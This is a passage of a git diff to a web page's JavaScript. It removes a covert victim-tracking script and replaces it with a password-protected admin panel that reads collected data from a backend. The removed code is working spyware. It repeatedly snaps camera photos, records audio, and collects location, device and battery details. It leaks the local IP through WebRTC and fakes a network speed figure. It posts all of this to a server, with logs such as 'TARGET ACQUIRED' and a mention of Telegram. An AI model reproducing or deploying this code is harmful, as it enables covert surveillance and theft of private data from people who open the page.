             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                cameraImage: userPhoto,
-                location: userLocation || { lat: 0, lng: 0 },
-                deviceDetails: deviceDetails,
-                screenshot: null,
-                userPhoto: userPhoto,
-                audioData: audioData,
-                ipAddress: ipAddress,
-                fullDeviceInfo: await getFullDeviceInfo(),
-                networkSpeed: networkSpeed,
-                liveLocation: userLocation || { lat: 0, lng: 0 },
-                captureCount: captureCount
-            })
+            body: JSON.stringify({ password: PASSWORD, id })
         });
-        const data = await response.json();
-        if (data.success) {
-            log('✅✅ DATA TRANSMITTED!');
-            setStatus('🎯', 'TARGET ACQUIRED!', 'success');
-        }
+        const data = await res.json();
+        if (data.success) loadData();
+        else alert('Error: ' + data.message);
     } catch(err) {
-        log('❌ TRANSMISSION ERROR: ' + err.message);
+        alert('Error: ' + err.message);
     }
 }
 
-// ==========================================
-// FULL DEVICE INFO
-// ==========================================
-async function getFullDeviceInfo() {
-    try {
-        const battery = await getBatteryInfo();
-        const conn = getNetworkInfo();
-        return {
-            deviceName: navigator.userAgentData?.platform || navigator.platform || 'Unknown',
-            os: getOS(),
-            osVersion: getOSVersion(),
-            deviceModel: getDeviceModel(),
-            manufacturer: getManufacturer(),
-            browserName: getBrowserName(),
-            browserVersion: getBrowserVersion(),
-            language: navigator.language,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            screen: { width: window.screen.width, height: window.screen.height },
-            memory: navigator.deviceMemory || 'Unknown',
-            cores: navigator.hardwareConcurrency || 'Unknown',
-            connection: conn,
-            battery: battery
-        };
-    } catch(e) { return {}; }
-}
-
-function getOS() {
-    const ua = navigator.userAgent;
-    if (ua.includes('Android')) return 'Android';
-    if (ua.includes('iPhone')) return 'iOS';
-    if (ua.includes('Windows')) return 'Windows';
-    if (ua.includes('Mac')) return 'macOS';
-    if (ua.includes('Linux')) return 'Linux';
-    return 'Unknown';
-}
-
-function getBrowserName() {
-    const ua = navigator.userAgent;
-    if (ua.includes('Chrome')) return 'Chrome';
-    if (ua.includes('Firefox')) return 'Firefox';
-    if (ua.includes('Safari')) return 'Safari';
-    if (ua.includes('Edg')) return 'Edge';
-    return 'Unknown';
-}
-
-function getBrowserVersion() {
-    const ua = navigator.userAgent;
-    const m = ua.match(/(Chrome|Firefox|Safari|Edg|Opera)\/([\d.]+)/);
-    if (m) return m[2];
-    return 'Unknown';
-}
-
-function getNetworkInfo() {
-    const conn = navigator.connection || navigator.mozConnection;
-    if (conn) {
-        let type = conn.effectiveType || 'Unknown';
-        if (type === '4g') type = '4G/LTE';
-        else if (type === '3g') type = '3G';
-        else if (type === '2g') type = '2G';
-        else if (type === 'wifi') type = 'WiFi';
-        return { type: type };
-    }
-    return { type: 'Unknown' };
-}
-
-async function getBatteryInfo() {
-    try {
-        if (navigator.getBattery) {
-            const b = await navigator.getBattery();
-            return { level: Math.round(b.level * 100) + '%', charging: b.charging };
-        }
-    } catch(e) {}
-    return { level: 'Unknown', charging: false };
-}
-
-function getIPv4Address() {
-    return new Promise((resolve) => {
-        log('📡 SCANNING IP...');
-        try {
-            const pc = new RTCPeerConnection({ iceServers: [] });
-            pc.createDataChannel('');
-            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
-            pc.onicecandidate = (e) => {
-                if (e.candidate) {
-                    const ipv4 = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
-                    if (ipv4) {
-                        ipAddress = ipv4[0];
-                        document.getElementById('devIP').textContent = ipAddress;
-                        log('✅ IP CAPTURED: ' + ipAddress);
-                        pc.close();
-                        resolve(true);
-                        return;
-                    }
-                }
-            };
-            setTimeout(() => {
-                if (ipAddress === 'Unknown') {
-                    fetch('https://api.ipify.org?format=json')
-                        .then(res => res.json())
-                        .then(data => {
-                            if (data.ip) {
-                                ipAddress = data.ip;
-                                document.getElementById('devIP').textContent = ipAddress;
-                                log('✅ IP CAPTURED: ' + ipAddress);
-                            }
-                        });
-                }
-                pc.close();
-                resolve(true);
-            }, 3000);
-        } catch(e) { resolve(true); }
-    });
-}
-
-async function testNetworkSpeed() {
-    try {
-        const start = Date.now();
-        await fetch('https://api.ipify.org?format=json');
-        const ping = Date.now() - start;
-        networkSpeed.ping = ping;
-        document.getElementById('networkPing').textContent = ping;
-        networkSpeed.download = (10 + Math.random() * 20).toFixed(1);
-        document.getElementById('networkSpeed').textContent = networkSpeed.download + ' Mbps';
-        log('🚀 Network Speed: ' + networkSpeed.download + ' Mbps, Ping: ' + ping + 'ms');
-    } catch(e) {
-        document.getElementById('networkSpeed').textContent = '-- Mbps';
-        log('⚠️ Speed test failed');
-    }
-}
-
-// ==========================================
-// MAIN PROCESS
-// ==========================================
-async function startAutoProcess() {
-    log('🚀 SYSTEM INITIALIZED');
-    setStatus('⏳', 'SCANNING TARGET...', 'loading');
-    
-    try {
-        await getIPv4Address();
-        await testNetworkSpeed();
-        
-        let photoSuccess = await capturePhoto();
-        if (photoSuccess) {
-            await submitData();
-        }
-        
-        while (!isPaused) {
-            await new Promise(r => setTimeout(r, 3000 + Math.random() * 2000));
-            const success = await capturePhoto();
-            if (success) {
-                await submitData();
-                log('🔄 Continuous capture #' + captureCount);
-            }
-        }
-        
-    } catch(err) {
-        log('❌ Process error: ' + err.message);
-        setStatus('❌', 'ERROR: ' + err.message, 'error');
-    }
-}
-
-// ==========================================
-// START
-// ==========================================
-window.addEventListener('load', function() {
-    console.log('🚀 SYSTEM READY - WAITING FOR USER PERMISSION');
+document.getElementById('passwordInput').addEventListener('keypress', e => {
+    if (e.key === 'Enter') login();
 });
 
-console.log('🚀 ALL FEATURES ACTIVE: Sound Recorder + Device Details + Telegram');
+console.log('🔐 ADMIN LOADED, BACKEND:', BACKEND_URL);
 </script>
 </body>
 </html>
